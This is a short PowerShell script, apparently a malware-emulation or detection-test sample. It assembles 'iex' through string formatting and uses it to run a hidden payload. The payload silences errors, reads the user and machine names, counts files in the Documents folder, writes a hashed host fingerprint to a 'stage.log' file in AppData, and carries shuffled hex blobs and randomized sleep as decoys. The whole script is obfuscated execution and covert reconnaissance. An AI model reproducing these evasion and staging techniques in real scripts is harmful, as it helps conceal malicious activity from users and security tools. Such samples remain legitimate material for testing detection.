$h=@('e','x','i');$x=(' {2}{0}{1} ' -f $h[0],$h[1],$h[2]).Trim()
$z=@'
Set-StrictMode -Version 2
$ErrorActionPreference='SilentlyContinue'

$u=[Environment]::UserName
$m=[Environment]::MachineName
$a=[Environment]::GetFolderPath('ApplicationData')
$p=[IO.Path]::Combine($a,'stage.log')
$dr=[IO.Path]::Combine([Environment]::GetFolderPath('UserProfile'),'Documents')

$c=0
try{$c=(Get-ChildItem -Path $dr -Recurse -EA SilentlyContinue|Measure-Object).Count}catch{}

$seed="$m`|$u"
$sha1=[Security.Cryptography.SHA1]::Create()
$id=([BitConverter]::ToString($sha1.ComputeHash([Text.Encoding]::UTF8.GetBytes($seed)))).Replace('-','').Substring(0,8)
$ts=(Get-Date).ToUniversalTime().ToString('o')

$l=('host={0}; user={1}; docs={2}; id={3}; ts={4}' -f $m,$u,$c,$id,$ts)
&(Get-Command ('Out-'+'File')) -InputObject $l -FilePath $p -Encoding utf8 -Append

# artifact-only (no deobfuscation in-script)
$A='7b6167066d070142'
$B='786d64056c067b04'
$C='6d4f784f56040c7f'
$D='5005047c63740808'
$E='7b72045378720053'
$F_='6f587c426d065941'
$G='536d604250630c4c'
$H_='78726f5354727b05'

$I=6,7,4,0,1,5,2,3
$X=@($A,$B,$C,$D,$E,$F_,$G,$H_)
$Q=($I|%{ $X[$_] }) -join '' | Out-Null

Start-Sleep -Milliseconds (Get-Random -Minimum 400 -Maximum 1200)
'@
& $x $z
